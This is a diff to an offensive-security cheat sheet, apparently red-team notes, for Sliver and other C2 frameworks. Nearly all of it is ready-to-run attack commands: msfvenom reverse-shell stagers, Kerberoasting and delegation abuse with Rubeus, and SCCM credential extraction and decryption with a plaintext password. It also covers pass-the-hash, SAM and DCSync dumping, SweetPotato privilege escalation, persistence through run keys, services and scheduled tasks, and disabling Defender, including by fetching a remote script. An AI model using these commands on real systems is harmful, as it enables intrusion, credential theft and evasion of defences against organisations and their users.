@@ -2643,19 +2643,21 @@ netsh interface portproxy reset
 Commertial and open source options available.
 <a href='https://www.thec2matrix.com'>C2 Matrix:</a> - C2 research
 Common C2:
-- Metasploit
-- Powershell Empire (old)
-- silenttrinity (byt3bl33d3r)
-- Sliver (BishopFox)
-- Mythic
-- Merlin
-- Nighthawk
-- HardHat
-- Covenant
 - Cobalt Strike
+- Covenant
+- HardHat
 - Havoc
-- Voodoo
+- Merlin
+- Metasploit
+- Mythic
+- Nighthawk
+- Powershell Empire (old)
+- PoshC2
+- SharpC2
+- SILENTTRINITY (byt3bl33d3r)
 - Scythe
+- Sliver (BishopFox)
+- Voodoo
 
 ## Sliver
 
@@ -2698,7 +2700,7 @@ msfvenom -p generic/custom PAYLOADFILE=/var/www/html/SOMETHING.bin -a x64 --plat
 ```
 
 ### Stagers
-## Metasploit
+Metasploit
 ```
 # Generate Profile
 new beacon --mtls 192.168.1.1:443 --format shellcode shellcode-beacon
@@ -2709,7 +2711,7 @@ stage-listener --url http://192.168.1.1:1234 --profile win-shellcode --prepend-s
 # Generate Stager (Format can be anything)
 msfvenom -p windows/x64/custom/reverse_winhttp LHOST=192.168.122.1 LPORT=1234 LURI=/hello.woff -f raw -o /tmp/stager.bin
 ```
-## Sliver
+Sliver
 ```
 [Unencrypted]
 
@@ -2755,7 +2757,7 @@ or
 https://192.168.1.11:8080/anything.woff
 ```
 
-## Simple PowerShell Shellcode Runner
+Simple PowerShell Shellcode Runner
 ```
 function LookupFunc {
 
@@ -2879,6 +2881,143 @@ armory install .net-pivot
 armory install .net-execute
 ```
 
+Host Situational Awareness
+```
+execute -o whoami /all
+execute -o hostname
+execute -o ipconfig
+execute -o net localgroup "administrators"
+```
+
+### Domain Enumeration
+```
+# Enumerate Current Domain Info
+c2tc-domaininfo
+
+# SharpView
+sharpview
+
+# BloodHound Collector
+sharp-hound-4 -- '-c all,GPOLocalGroup'
+```
+
+### Kerberoasting
+```
+rubeus kerberoast /nowrap
+
+https://github.com/wavvs/nanorobeus
+```
+
+### Delegations
+
+Constrained
+```
+# Enumeration
+execute-assembly ~/www/windows/StandIn.exe --delegation
+
+# Passing Creds (ptt)
+execute-assembly ~/www/windows/Rubeus.exe s4u /user:user1 /rc4:<hash> /impersonateuser:Administrator /msdsspn:"time/<target>.domain.local" /altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm /ptt
+
+# As Current User (ptt)
+execute-assembly ~/www/windows/Rubeus.exe tgtdeleg /nowrap
+execute-assembly ~/www/windows/Rubeus.exe s4u /ticket:doIFCDC[SNIP]E9DQUw= /impersonateuser:Administrator /domain:domain.local /msdsspn:"time/<target>.domain.local" /altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm /ptt
+
+# Manual PTT
+execute-assembly ~/www/windows/Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DOMAIN /username:[user] /password:FakePass /ticket:doIGaD[...]ljLmlv
+migrate -p [PID]
+
+# Check Access
+ls //HOST/C$
+
+
+# May need to remove the FQDN from the msdsspn attribute.
+```
+
+```
+# Create Computer Acc (If No Access to Computer Acc Already)
+execute-assembly ~/www/windows/StandIn.exe --computer EvilComputer --make
+
+# Retrieve Authentication Keys
+execute-assembly ~/www/windows/Rubeus.exe hash /password:ComputerPass /user:EvilComputer$ /domain:domain.local
+
+# Retrieve TGT
+execute-assembly ~/www/windows/Rubeus.exe asktgt /user:EvilComputer$ /aes256:7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044 /nowrap
+
+or 
+
+# Tickets Stored on Local Machine
+execute-assembly ~/www/windows/Rubeus.exe triage
+
+# Dump krbtgt for local machine
+execute-assembly ~/www/windows/Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
+
+# Perform RBCD
+execute-assembly ~/www/windows/Rubeus.exe s4u /user:PC$ /impersonateuser:bob /msdsspn:cifs/dc.domain.local /ticket:doIFuD[...]5JTw== /nowrap
+
+# Pass the Ticket
+execute-assembly ~/www/windows/Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DOMAIN /username:bob /password:FakePass /ticket:doIGcD[...]MuaW8=
+
+# Migrate (Steal Token)
+migrate -p [PID]
+```
+
+### SQL
+```
+SQLRecon
+
+
+TO BE CONTINUED...
+```
+
+
+### SCCM
+SharpSCCM
+```
+# Identify Management Points
+execute-assembly ~/www/windows/SharpSCCM.exe local site-info --no-banner
+
+# Identify Full Control over System Management container
+execute-assembly ~/www/windows/SharpSCCM.exe get site-info -d cyberbotic.io --no-banner
+
+# Identify Collections
+execute-assembly ~/www/windows/SharpSCCM.exe get collections --no-banner
+
+# Identfiy Collection Members
+execute-assembly ~/www/windows/SharpSCCM.exe get collection-members -n DOMAIN --no-banner
+
+# Get SCCM Devices
+execute-assembly ~/www/windows/SharpSCCM.exe get devices -n WKSTN -p Name -p FullDomainName -p IPAddresses -p LastLogonUserName -p OperatingSystemNameandVersion --no-banner
+
+# Extract Network Access Account (NAA) Credentials
+execute-assembly ~/www/windows/SharpSCCM.exe local naa -m wmi --no-banner
+execute-assembly ~/www/windows/SharpSCCM.exe get naa --no-banner
+```
+
+SQLRecon
+```
+# Display all SCCM users
+execute-assembly ~/www/windows/SQLRecon.exe /a:WinDomain /h:sccmsql.sccmlab.local /d:sccmlab.local /u:sccmadmin /p:quei8Xa4oeN2Ohdu /database:CM_S01 /m:sUsers
+
+# Display all other sites with data stored
+execute-assembly ~/www/windows/SQLRecon.exe /a:WinDomain /h:sccmsql.sccmlab.local /d:sccmlab.local /u:sccmadmin /p:quei8Xa4oeN2Ohdu /database:CM_S01 /m:sSites
+
+# Display all associated SCCM clients and the last logged in user
+execute-assembly ~/www/windows/SQLRecon.exe /a:WinDomain /h:sccmsql.sccmlab.local /d:sccmlab.local /u:sccmadmin /p:quei8Xa4oeN2Ohdu /database:CM_S01 /m:sLogons
+
+# Display all task sequences, but do not access the task data contents
+execute-assembly ~/www/windows/SQLRecon.exe /a:WinDomain /h:sccmsql.sccmlab.local /d:sccmlab.local /u:sccmadmin /p:quei8Xa4oeN2Ohdu /database:CM_S01 /m:sTaskList
+
+# Decrypt all task sequences to plaintext
+execute-assembly ~/www/windows/SQLRecon.exe /a:WinDomain /h:sccmsql.sccmlab.local /d:sccmlab.local /u:sccmadmin /p:quei8Xa4oeN2Ohdu /database:CM_S01 /m:sTaskData
+
+# Display encrypted credentials vaulted by SCCM
+execute-assembly ~/www/windows/SQLRecon.exe /a:WinDomain /h:sccmsql.sccmlab.local /d:sccmlab.local /u:sccmadmin /p:quei8Xa4oeN2Ohdu /database:CM_S01 /m:sCredentials
+
+# Attempt to decrypt recovered SCCM credential blobs. Must be ran in a high-integrty or SYSTEM process on an SCCM server
+execute-assembly ~/www/windows/SQLRecon.exe /a:WinDomain /h:sccmsql.sccmlab.local /d:sccmlab.local /u:sccmadmin /p:quei8Xa4oeN2Ohdu /database:CM_S01 /m:sDecryptCredentials
+```
+
+
 ### Lateral Movement
 PSExec
 ```
@@ -2903,11 +3042,14 @@ atexec.py DOMAIN/user:pass@192.168.1.1 "powershell.exe -enc [ENCODED IEX to grab
 
 Pass-the-Hash
 ```
-# NTLM Hash execute-assembly ~/www/windows/SharpKatz.exe --Command pth --User username --Domain userdomain --NtlmHash ntlmhash 
+# NTLM Hash
+execute-assembly ~/www/windows/SharpKatz.exe --Command pth --User username --Domain userdomain --NtlmHash ntlmhash 
 
-# Migrate / Steal Token migrate -p [PID OF PTH COMMAND] 
+# Migrate / Steal Token
+migrate -p [PID OF PTH COMMAND] 
 
 (Misc) 
+
 # Generate NTLM Hash from plaintext password 
 execute-assembly ~/www/windows/Rubeus.exe hash /user:user1 /password:password1 [/domain:domain] 
 
@@ -2916,9 +3058,8 @@ execute-assembly ~/www/windows/SharpLdapWhoami.exe /all
 ```
 
 ### Credential Dumping
+SAM
 ```
-# SAM
-
 # Local
 hashdump
 sideload --process werfault.exe /tmp/gosecretsdump.exe -system '\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system' -sam '\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system
@@ -2962,7 +3103,7 @@ execute-assembly ~/www/windows/SharpKatz.exe --Command dcsync --User user --Doma
 ### Privilege Escalation
 ```
 # SeImpersonatePrivilege
-inline-execute-assembly /home/goad/tools/SweetPotato.exe "-p C:\\Users\\Public\\Desktop\\EVIL.exe"
+inline-execute-assembly ~/www/windows/SweetPotato.exe "-p C:\\Users\\Public\\Desktop\\EVIL.exe"
 
 # Alternative to SweetPotato
 https://github.com/BeichenDream/GodPotato
@@ -2985,16 +3126,16 @@ getsystem
 -- USER
 
 # Registry Run Key
-execute-assembly /home/goad/tools/SharpCollection/NetFramework_4.7_x64/SharPersist.exe '-t reg -c "C:\Windows\System32\cmd.exe" -a "/c C:\Users\Administrator\Desktop\Excel.exe" -k "hkcurun" -v "test stuff" -m add'
+execute-assembly ~/www/windows/SharPersist.exe '-t reg -c "C:\Windows\System32\cmd.exe" -a "/c C:\Users\Administrator\Desktop\Beacon.exe" -k "hkcurun" -v "test stuff" -m add'
 
 
 -- SYSTEM
 
 # Service
-execute-assembly /home/goad/tools/SharpCollection/NetFramework_4.7_Any/SharPersist.exe '-t service -c "C:\Windows\System32\cmd.exe" -a "/c C:\Users\Public\Desktop\Excel.exe" -n "SomeService" -m add'
+execute-assembly ~/www/windows/SharPersist.exe '-t service -c "C:\Windows\System32\cmd.exe" -a "/c C:\Users\Public\Desktop\Beacon.exe" -n "SomeService" -m add'
 
 # Scheduled Tasks
-execute-assembly /home/goad/tools/SharpCollection/NetFramework_4.7_Any/SharPersist.exe '-t schtask -c "C:\Windows\System32\cmd.exe" -a "/c C:\Users\Public\Desktop\Excel.exe" -n "Some Task" -o logon -m add'
+execute-assembly ~/www/windows/SharPersist.exe '-t schtask -c "C:\Windows\System32\cmd.exe" -a "/c C:\Users\Public\Desktop\Beacon.exe" -n "Some Task" -o logon -m add'
 ```
 
 
@@ -3010,10 +3151,28 @@ Auth
 socks5 start --host <host> --port <port> --user <user>
 ```
 
+Misc
+```
+# List Files on Remote PC
+ls //host/C$
+
+# Upload to Remote PC
+cd //host/C$
+upload /path/to.exe
+
+# Disable AV
+
+Local
+execute -o cmd /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
+
+Remote
+sharp-wmi -- 'action=executevbs computername=host.fqdn.local url="http://192.168.1.1/disable_defender.ps1"'
+```
+
 
 ### Extras
 
-## Sliver Mods
+Sliver Mods
 ```
 # Add Mimikatz Reflective DLL
 
@@ -3048,10 +3207,19 @@ https://github.com/wavvs/nanorobeus
 ```
 
 
-## Example Extensions
+Example Extension
 ```
 https://github.com/thelikes/SliverExtensionSample
 ```
+
+Custom Commands
+```
+https://security.humanativaspa.it/customizing-sliver-part-1/
+https://security.humanativaspa.it/customizing-sliver-part-2/
+https://security.humanativaspa.it/customizing-sliver-part-3/
+```
+
+
 
 
 ## Cobalt Strike
